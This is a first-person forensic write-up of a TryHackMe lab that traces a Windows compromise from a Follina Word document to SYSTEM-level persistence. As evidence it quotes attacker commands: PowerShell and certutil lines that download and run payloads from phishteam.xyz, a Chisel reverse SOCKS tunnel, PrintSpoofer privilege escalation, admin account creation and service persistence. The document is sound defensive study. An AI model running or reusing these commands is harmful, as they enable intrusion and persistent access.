Tempest: Reconstructing a Full Windows Compromise from Sysmon, EVTX and PCAP Evidence

This writeup documents my investigation of the TryHackMe Tempest room. I approached it like a SOC/DFIR case: verify the artifacts first, correlate endpoint and network evidence, separate confirmed findings from assumptions, and then rebuild the attack chain from the malicious document to persistence.

Case objective: determine how the Tempest workstation was compromised, identify the malicious document, follow the staged payloads, recover the C2 behavior, and document how the attacker escalated privileges and established persistence.

Executive Summary

The Tempest workstation was compromised after the user TEMPEST\benimaru opened a malicious Word document named free_magicules.doc. The document reached out to phishteam.xyz and triggered an MSDT/Follina-style execution chain identified as CVE-2022-30190. The payload decoded to a PowerShell command that placed content in the user's Startup folder, which later caused PowerShell to download and run first.exe.

The stage 2 binary first.exe communicated with resolvecyber.xyz:80. The C2 traffic used HTTP GET requests, placed base64-encoded command output in the q parameter, and used a Nim httpclient/1.6.6 User-Agent. By decoding the C2 traffic, I observed internal reconnaissance, credential discovery from automation.ps1, and enumeration of WinRM on port 5985.

After harvesting the password infernotempest, the attacker used Chisel to establish a reverse SOCKS proxy and authenticated through WinRM. They then downloaded spf.exe, identified as PrintSpoofer, abused SeImpersonatePrivilege, and executed C:\ProgramData\final.exe as an elevated C2 payload on port 8080. Once SYSTEM-level access was achieved, the attacker created users shion and shuna, added shion to the local Administrators group, and created an auto-start service named TempestUpdate2 pointing to final.exe.

free_magicules.doc → MSDT/Follina → Startup folder payload → first.exe C2 → credential discovery → Chisel reverse SOCKS → WinRM → PrintSpoofer → final.exe elevated C2 → user/service persistence

Investigation Methodology

I started by validating the integrity of the provided artifacts. This is a small step, but it matters in a DFIR workflow because all later conclusions depend on the evidence being consistent. I then converted the EVTX logs to CSV using EvtxECmd and reviewed them in Timeline Explorer, which made it easier to pivot between process creation, file creation, registry activity, DNS queries and network connections.

My main rule during the investigation was not to treat a single event as the whole story. For example, a domain in a command line is useful, but it becomes much stronger when the same domain appears in Sysmon DNS logs and in the PCAP. The same logic applied to process chains: I started with WINWORD.EXE, followed child processes, then correlated later auto-start execution through explorer.exe.

  1. Verify artifacts. Calculate hashes for capture.pcapng, sysmon.evtx and windows.evtx.
  2. Start from the alert context. The SOC note said the intrusion began with a downloaded .doc file.
  3. Follow process relationships. Use Sysmon Event ID 1, process IDs and parent process IDs to follow Word, PowerShell, certutil and later payloads.
  4. Correlate endpoint and network evidence. Use Sysmon DNS/Network events and PCAP HTTP evidence to confirm domains, URLs and ports.
  5. Decode attacker-controlled data. Use CyberChef to decode base64 in payloads and C2 URI parameters.
  6. Validate privilege and persistence activity. Use Windows Security Event IDs and Sysmon command lines to confirm account creation, group changes and service creation.

Initial Access: Malicious Document

The first useful pivot was the alert context: the malicious file had a .doc extension and had been downloaded through Chrome. Searching the Sysmon timeline for .doc led to C:\Users\benimaru\Downloads\free_magicules.doc. The presence of Zone.Identifier entries supported that this file came from an external source.

The Word process that opened the document was WINWORD.EXE with PID 496. I did not treat the document as malicious only because of the filename; I tied it to Word execution, the user context TEMPEST\benimaru, and later command execution through MSDT.

The command line that mattered was the MSDT protocol handler invocation:

C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression(...FromBase64String(...)))"

This matched the Follina/MSDT RCE pattern and supported the CVE identification as CVE-2022-30190.

The embedded base64 decoded to a PowerShell command that moved into the user's Startup folder, downloaded update.zip, extracted it, and removed the archive:

$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;

At this point, the attacker was setting up a second-stage execution path that would run after the user logged in again.

Stage 2 Execution

The next pivot was the Startup folder. The payload path confirmed by the room was:

C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Once the compromised user logged in, the implanted payload launched a hidden, non-interactive PowerShell command. The command used certutil.exe as a LOLBin to download first.exe, then immediately executed it:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

The binary downloaded for this stage had the SHA256 hash:

CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

The use of certutil did not automatically prove malicious activity by itself, but in this case the context was strong: it was launched by the staged payload, pulled an executable from attacker infrastructure, placed it in a public download directory, and immediately executed it.

Network Traffic and C2 Behavior

The PCAP helped validate what Sysmon already suggested. The malicious document retrieved the remote HTML resource:

http://phishteam.xyz/02dcf07/index.html

This request used a Microsoft Office Word User-Agent, which tied the network traffic back to the document rather than a later payload. The malicious domain resolved to 167.71.199.191.

The stage 2 payload then connected to:

resolvecyber.xyz:80

The C2 protocol was simple but effective. HTTP GET requests were sent to /9ab62b5, and the q parameter contained base64-encoded command output:

/9ab62b5?q=<base64-encoded command output>

Decoding one of the C2 parameters revealed output from net localgroup administrators. The User-Agent was Nim httpclient/1.6.6, which indicated that the malware was likely compiled using Nim.

Discovery and Internal Reconnaissance

Because the C2 data was base64, I decoded several URI parameters in CyberChef. One decoded request showed that the attacker read:

C:\Users\Benimaru\Desktop\automation.ps1

The script contained a plaintext credential:

$user = "TEMPEST\benimaru"
$pass = "infernotempest"

This was a key pivot. The password infernotempest gave the attacker something useful to try against internal services. Further decoded traffic showed listening port enumeration. Port 5985 stood out because it is associated with WinRM, which can provide remote command execution when valid credentials are available.

After identifying WinRM, the attacker established a reverse SOCKS proxy using Chisel:

C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

The SHA256 hash of this binary was:

8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

VirusTotal enrichment identified the binary as Chisel. The command syntax also matched Chisel's reverse SOCKS usage. After the proxy was established, the succeeding activity showed that the harvested credentials were used through winrm.

Privilege Escalation

After gaining a stable shell, the attacker checked the current user's privileges and downloaded another tool:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iwr http://phishteam.xyz/02dcf07/spf.exe -outfile spf.exe

The downloaded binary was:

spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

Hash enrichment identified it as PrintSpoofer64.exe, and the behavior matched PrintSpoofer. The exploited privilege was SeImpersonatePrivilege. The command used the -c option to execute a second payload:

C:\Users\benimaru\Downloads\spf.exe -c C:\ProgramData\final.exe

This caused final.exe to run as the elevated C2 payload. Unlike the first C2 connection on port 80, final.exe connected on port 8080.

Actions on Objective and Persistence

After achieving SYSTEM-level execution, the attacker created two local accounts:

shion
shuna

The initial account creation attempts failed because the attacker missed the /add option. Windows Event ID 4720 confirmed successful local account creation. The attacker then added shion to the local Administrators group:

net localgroup administrators /add shion

Windows Event ID 4732 confirmed that a member was added to a security-enabled local group. Finally, the attacker created service-based persistence:

C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

This service points to the elevated C2 binary and is configured to start automatically, giving the attacker persistent administrative access after reboot.

Key Findings and Lessons Learned

  • Correlation made the case reliable. The malicious document was not identified from one log line. It was confirmed by file path, Word execution, MSDT behavior, DNS resolution and PCAP traffic.
  • Encoded traffic is still readable evidence. The C2 looked noisy at first, but decoding the q parameter exposed command output and attacker intent.
  • Credentials in scripts are high risk. The attacker found a plaintext password in automation.ps1 and used it to continue the intrusion.
  • Legitimate tools were abused heavily. PowerShell, certutil, sc.exe and WinRM are normal Windows components, but the surrounding context showed malicious usage.
  • Privilege escalation was predictable after whoami /priv. Once SeImpersonatePrivilege was available, PrintSpoofer became a strong investigative hypothesis and was later confirmed by hash and command line.

Recommended Remediation

  • Isolate the Tempest workstation from the network and preserve forensic artifacts before reimaging.
  • Disable or reset compromised accounts, especially benimaru, shion and shuna.
  • Remove malicious files including first.exe, ch.exe, spf.exe, and C:\ProgramData\final.exe.
  • Delete the malicious service TempestUpdate2 and inspect all auto-start entries, including the Startup folder.
  • Block or monitor phishteam.xyz, resolvecyber.xyz, 167.71.199.191 and related HTTP paths.
  • Review Windows Security logs for Event IDs 4720 and 4732, and hunt for unexpected local account or group changes.
  • Audit scripts and configuration files for plaintext credentials. Replace stored passwords with safer secret-management practices.
  • Harden WinRM access. Restrict it to trusted admin hosts, enforce strong authentication and monitor successful logons.
  • Deploy detections for msdt.exe with ms-msdt:, suspicious certutil -urlcache downloads, Chisel syntax such as R:socks, and service creation pointing to user-writable or unusual paths.

Conclusion

The attack chain was reconstructed by combining process creation, file creation, DNS, HTTP traffic and Windows Security events. The strongest evidence was the consistency between sources: Sysmon showed the processes and file paths, Brim and Wireshark showed the external network activity, and Windows Event Logs confirmed local account and group changes. Based on the evidence, the attacker moved from a malicious Word document to SYSTEM-level persistence using staged payloads, C2 over HTTP, credential discovery, Chisel tunneling, PrintSpoofer privilege escalation, local account creation and service-based persistence.
